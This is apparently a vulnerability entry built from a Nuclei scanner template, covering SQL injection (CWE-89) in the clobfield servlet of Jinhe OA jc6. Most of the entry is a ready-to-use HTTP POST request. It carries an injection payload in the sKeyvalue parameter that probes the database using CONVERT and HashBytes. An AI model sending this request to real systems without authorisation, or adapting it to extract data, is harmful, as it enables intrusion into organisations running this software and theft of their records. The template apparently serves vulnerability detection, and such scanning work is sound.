# Vulnerability: Jinhe OA - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`jinhe-jc6-sqli.yaml`)

## Description
SQL injection vulnerability in the ljc6/servlet/clobfield interface of Jinhe OA jc6. An attacker can obtain sensitive information.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /jc6/servlet/clobfield HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=11' and CONVERT(int,(select%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27{{num}}%27))))=1 and ''='
```

